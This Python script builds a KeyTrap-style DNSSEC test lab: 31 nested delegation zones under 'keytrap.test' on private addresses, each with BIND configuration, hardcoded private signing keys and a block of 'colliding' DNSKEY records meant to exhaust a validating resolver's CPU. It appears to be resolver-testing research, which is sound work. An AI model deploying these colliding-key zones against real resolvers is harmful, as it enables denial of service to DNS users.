import os

output_dir = 'redo/'
if not os.path.exists(output_dir):
    os.makedirs(output_dir)

# Create a zone file with a given depth
def creat_zone_file(depth=1):
    zone_dir = output_dir + f'redo{depth}/'
    if not os.path.exists(zone_dir):
        os.makedirs(zone_dir)
    zone_file = zone_dir + 'redo.' * depth + 'delegation.keytrap.test.zone'

    with open(zone_file, 'w') as f:
        f.write(f"""$TTL    86400
@       IN      SOA     ns1.{'redo.' * depth}delegation.keytrap.test. t0chus.keytrap.test (
                              2024091001 ; Serial
                              3600       ; Refresh
                              1800       ; Retry
                              604800     ; Expire
                              86400 )    ; Negative Cache TTL
;
@       IN      NS      ns1.{'redo.' * depth}delegation.keytrap.test.
ns1     IN      A       10.10.0.5
www     IN      A       10.10.0.5

redo    IN      A       10.10.0.{depth + 5}




; ksk
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 257 3 14 MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hl hZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zht L4aGaOG+870yHwuY
; zsk
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb

; colliding keys
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 qz2ys56wu+rPHXp62eskqFa/lYw4xl7oDT5X/wcj7fFapLq8zsOT3kM5E7IlKwa42cIqCcNcb6hG8C8YKWUOgUTOiXPXj7k4SO4K3/+CfFp+7J6ai8shKSFAMvhf2ajl
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 NJAIrXpcToloZ5CnSwyPf/Y8qyL3aFlqFr8Xcw/m19dBcyoJQIak5ygffLTHGrQhZNGM8TrL07v41sL1ZYuYjGBg7RBdMaeQr+JOUA4d5e/r83fkT7uHNOcHzOAhI7Nu
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 UiTl5T9RdFXTul4Nw3rQ9/zlGCODylgcI9mrz5SqpEkxw9+l+E00/JGxAj6If8yjE7Etexs/KTCX7csAYQTLq864iYB+5sPigcMHAzluyPU9fOUmALQbRtw3ZXPHBb7L
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 MjY4X0GT9jf00V9bZU7cMkceFGdUMgbeNK4afF6BB/VznyKXsZlTeX5IgrD/8BNWd1jMvvL5RlbBXbmy5022d34VqReK5IRA6WKxp9uzDBEpc6qoh2npdudDTsFMZKor
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 8y5y+PlI/MQAMADANSuw0UXq7WUGpGr+U+Y4sl+dAu78T+rZ1NUE1TVg5fZU7j7bO+Ie7Mk6DcquNT0zYX986pGJgXpx6jTDh3dztnt9Sc9SBcUdBw0v/u1y72EfLQ2P
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 EUCex5BxNR/cKQUYoHJD1Hj6TK+aMpntzC98Nv+ZegTklzXAxMxC8nAc9VSywVHBjTrkCnVYrY4Gu1YQfscREc+mjbyhUzEMZBHPIEAfuerZwu2wovC4mau3RVWHRhij
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 Mq9Ohq02Xq6D5GprEXuvkZFumkDNmUUEAmKtGG/7FfVeeu3ZMQankbw0eID2p8MB4dcSDotv4YHvx6Sx3t6zdjSFaCloAveMUnvtIQsXL8Kbfm2G0ikVuXtbMSHmFM9w
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 Nd/hhlFfE9YcGAKn/DjwaRDo2x1shj8A59LMXfNuxgPtRH1fT5k9EB1twCTEzqAQNLyx9a6t+Kma/LBXtapxM78FXNaleSnF2fJ40+7rCBnn1cFjvdHEPHkW4XUGToyO
""")

        key_dir = zone_dir + 'keys/'

        if not os.path.exists(key_dir):
            os.makedirs(key_dir)

        ksk_public = key_dir + f'K{'redo.' * depth}delegation.keytrap.test.+014+30130.key'
        ksk_private = key_dir + f'K{'redo.' * depth}delegation.keytrap.test.+014+30130.private'

        zsk_public = key_dir + f'K{'redo.' * depth}delegation.keytrap.test.+014+06350.key'
        zsk_private = key_dir + f'K{'redo.' * depth}delegation.keytrap.test.+014+06350.private'

    with open(ksk_public, 'w') as f:
        f.write(f"""; This is a key-signing key, keyid 30130, for {'redo.' * depth}delegation.keytrap.test.
; Created: 20240217062216 (Sat Feb 17 06:22:16 2024)
; Publish: 20240217062216 (Sat Feb 17 06:22:16 2024)
; Activate: 20240217062216 (Sat Feb 17 06:22:16 2024)
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 257 3 14 MzJsFTtAo0j8qGpDIhEMnK4ImTyYwMwDPU5gt/FaXd6TOw6AvZDAj2hl hZvaxMXV6xCw1MU5iPv5ZQrb3NDLUU+TW07imJ5GD9YKi0Qiiypo+zht L4aGaOG+870yHwuY
""")

    with open(ksk_private, 'w') as f:
        f.write(f"""Private-key-format: v1.3
Algorithm: 14 (ECDSAP384SHA384)
PrivateKey: ppaXHmb7u1jOxEzrLzuGKzbjmSLIK4gEhQOvws+cpBQyJbCwIM1Nrk4j5k94CP9e
Created: 20240217062216
Publish: 20240217062216
Activate: 20240217062216
""")

    with open(zsk_public, 'w') as f:
        f.write(f"""; This is a zone-signing key, keyid 6350, for {'redo.' * depth}delegation.keytrap.test.
; Created: 20240217094927 (Sat Feb 17 09:49:27 2024)
; Publish: 20240217094927 (Sat Feb 17 09:49:27 2024)
; Activate: 20240217094927 (Sat Feb 17 09:49:27 2024)
{'redo.' * depth}delegation.keytrap.test. IN DNSKEY 256 3 14 DcYreAh+USsK1mtv7bSR2iaQvShPUqCy7l/BRQXttAFupXp6pUaQZS+k ii+H2JJqd+rS4YgC3KCd/by8yQi5j+WSy2yRprSuFuDyqZMFnDT/Py+n GjmIa59+W1iMdEYb
""")

    with open(zsk_private, 'w') as f:
        f.write(f"""Private-key-format: v1.3
Algorithm: 14 (ECDSAP384SHA384)
PrivateKey: hj22bHPVtSrK+hVbwBKRyEUsPzZuzWRLodxoP3U0r6CvGjF3/vaWtJ4qiSpMi5AY
Created: 20240217094927
Publish: 20240217094927
Activate: 20240217094927
""")

    conf_dir = zone_dir + 'conf/'
    if not os.path.exists(conf_dir):
        os.makedirs(conf_dir)
    conf_base_file = conf_dir + 'named'
    with open(conf_base_file, 'w') as f:
        f.write("""ROOTDIR=/var/named/chroot
OPTIONS=-4
""")
    with open(conf_base_file + '.conf', 'w') as f:
        f.write("""acl "internal-network" {
        localhost;
        127.0.0.1/32;
        172.16.0.0/12;
        192.168.0.0/16;
        10.0.0.0/8;
};

options {
        version "unknown";
        hostname "ns1.%sdelegation.keytrap.test";

        directory "/var/named/";
        dump-file "/data/cache_dump.db";
        statistics-file "/data/named_status.dat";
        pid-file "/var/run/named/named.pid";

        listen-on port 53 {
                internal-network;
        };

        allow-query { internal-network; };

        notify yes;
        max-transfer-time-in 60;
        transfer-format many-answers;
        transfers-in 10;
        transfers-per-ns 2;
        allow-transfer { none; };
        allow-update { none; };
};


zone "%sdelegation.keytrap.test." IN {
        type master;
        file "%sdelegation.keytrap.test.zone.signed";
        allow-update { none; };
};
""" % ('redo.' * depth, 'redo.' * depth, 'redo.' * depth))



for i in range(1, 32):
    creat_zone_file(i)

